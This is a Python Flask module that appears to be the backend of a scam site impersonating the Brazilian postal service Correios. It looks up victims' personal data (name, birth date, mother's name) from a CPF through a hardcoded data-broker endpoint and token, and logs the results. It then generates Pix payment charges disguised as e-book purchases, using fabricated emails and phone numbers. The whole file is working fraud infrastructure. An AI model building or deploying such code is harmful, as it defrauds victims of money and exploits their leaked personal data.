from flask import Blueprint, request, make_response, render_template, \
                  flash, g, session, redirect, url_for, app, jsonify

import datetime
from database import mongo
from user_agents import parse
from os.path import exists
import urllib.parse
import json
import uuid, re, requests
import sys
import asyncio
from rich.console import Console
from operator import itemgetter
from bson import ObjectId
from threading import Thread
from time import sleep
import random
import logging
console = Console()

u = json.load(open('./sites.json'))
correios = Blueprint('correios', __name__, url_prefix=f'/{u["correios"]}')

# Configuração de logs
logging.basicConfig(level=logging.INFO)
correios_logger = logging.getLogger("CORREIOS")
#

@correios.before_request
def make_session_permanent():
    session.permanent = True

#
def login():
    return render_template('correios2/index.html',prefix=session['prefix'])

#
def login2():
    return render_template('correios/final.html',prefix=session['prefix'])

#
def valid2():

    headers = {
        'accept': '*/*',
        'accept-language': 'pt-BR,pt;q=0.9',
        'content-type': 'application/json',
        'priority': 'u=1, i',
        'referer': 'https://paguetaxalive.com/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    }
    cpf = request.get_json()['cpf']
    cpf = cpf.replace('-','').replace('.','').replace(' ','')
    response = requests.get(f"http://192.241.158.251:8081/SerasaCpf?token=ff29046e-3321-4031-95e3-f47a7c5d551f&cpf={cpf}&local=correios", headers=headers)
    if 'CONTATOS_ID' in response.text:
        from datetime import datetime
        date_obj = datetime.strptime(response.json()['result']['NASC'], "%Y-%m-%d %H:%M:%S")
        formatted_date = date_obj.strftime("%d/%m/%Y")
        response = {
            "success": True,
            "message": {
                "name": response.json()['result']['NOME'],
                "nasc": formatted_date,
                "mae": response.json()['result']['NOME_MAE'],
                "cpf": cpf

            }
        }
        return jsonify(response)
    else:
        return jsonify(success=False)

    return response.json(),200

#
def valid():


    headers = {
        'accept': '*/*',
        'accept-language': 'pt-BR,pt;q=0.9',
        'content-type': 'application/json',
        # 'cookie': 'connect.sid=s%3AGen5yy8Z7XDdzgYLrN5z9hLEVT4_DNrJ.nbPWIbxKgZp%2BvOyQ%2BTV%2B5BQp1Z%2B1Zgm3pMs1hgqdMmA',
        'priority': 'u=1, i',
        'referer': 'https://paguetaxalive.com/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    }
    cpf = request.get_json()['cpf']
    cpf = cpf.replace('-','').replace('.','').replace(' ','')
    response = requests.get(f"http://192.241.158.251:8081/SerasaCpf?token=ff29046e-3321-4031-95e3-f47a7c5d551f&cpf={cpf}&local=correios", headers=headers)

    if 'CONTATOS_ID' in response.text:
        from datetime import datetime
        date_obj = datetime.strptime(response.json()['result']['NASC'], "%Y-%m-%d %H:%M:%S")
        formatted_date = date_obj.strftime("%d/%m/%Y")
        correios_logger.info(f"{response.json()['result']['NOME']} - {formatted_date}")
        response = {
            "success": True,
            "message": {
                "name": response.json()['result']['NOME'],
                "nasc": formatted_date,
                "mae": response.json()['result']['NOME_MAE'],
                "cpf": cpf

            }
        }

        # session['dados']['nome'] = response.json()['result']['NOME']
        # session['dados']['cpf'] = cpf

        return jsonify(response)
    else:

        return jsonify(success=False)

    return response.json(),200

#
def pix_():
    data = request.get_json()  # Obtém o JSON recebido

    url = session['taxas']['api_url']
    correios_logger.info(session['taxas'])
    #url = "https://api2.firepag.com/api/user/transactions"
    # ip_address = request.remote_addr
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip_address:
        ip_address = ip_address.split(',')[0].strip()  # Primeiro IP

    # Geração de email com base no nome
    nome = data['nome'].lower().replace(' ', '.')
    email = f"{nome}@gmail.com"

    # Geração de um telefone fictício
    phone = f"{random.randint(10, 99)}9{random.randint(1000, 9999)}{random.randint(1000, 9999)}"

    payload = {
        "customer": {
            "document": {
                "number": data['cpf'],  # CPF vindo do JSON recebido
                "type": "cpf"
            },
            "name": data['nome'],  # Nome vindo do JSON recebido
            "email": email,  # Email gerado
            "phone": phone,  # Telefone gerado
            "id": str(uuid.uuid4())
        },
        "amount": session['valores']['valor'],
        "paymentMethod": session['taxas']['paymentMethod'],
        "items": [
            {
                "title": F"EBOOK #{str(uuid.uuid4())}",
                "unitPrice": session['valores']['valor'],
                "quantity": 1,
                "tangible": True
            }
        ],
        "traceable": True,
        "pix": { "expiresInDays": 1 },
        "ip": ip_address
    }

    headers = {
        "content-type": "application/json",
        "Authorization": f"Basic {session['taxas']['api']}"
    }

    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        correios_logger.info(response.json()['data']['pix']['qrcode'])
        return jsonify(copiaecola=response.json()['data']['pix']['qrcode'],success=True),200

    return jsonify(success=False),200

@correios.route('/<path:path>', methods=['GET', 'POST', 'PUT'])
def index_redir(path):

    
    try:
        path_segments = path.split("/")
        if len(path_segments) < 2:
            raise ValueError("Invalid path format.")
        
        prefix, action = path_segments[0], path_segments[1]

        if prefix == session.get('prefix'):
            try:
                if action == 'login':
                    return login()
                elif action == 'login2':
                    return login2()
                elif action == 'valid':
                    try:
                        cpf = request.get_json()['cpf']
                        correios_logger.info(F'VALIDANDO: {cpf}')
                    except:
                        error = 1
                    return valid()
                elif action == 'pix':
                    correios_logger.info(f'GERANDO PIX: {session["d"]["usuario"]}')
                    return pix_()
                elif action == 'showIp':
                    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
                    if ip_address:
                        ip_address = ip_address.split(',')[0].strip()  # Primeiro IP
                    correios_logger.info(ip_address)
                    return {"ip_address": ip_address}, 200
                else:
                    return {}, 404  # Not Found if the action is not recognized
            except Exception as e:
                correios_logger.info(f"Error during action execution: {e}")
                session["ads"] = ''
                return {}, 500
        else:
            session.clear()
            return redirect("/")

    except Exception as e:
        correios_logger.info(f"General error: {e}")

        session.clear()
        return redirect("/")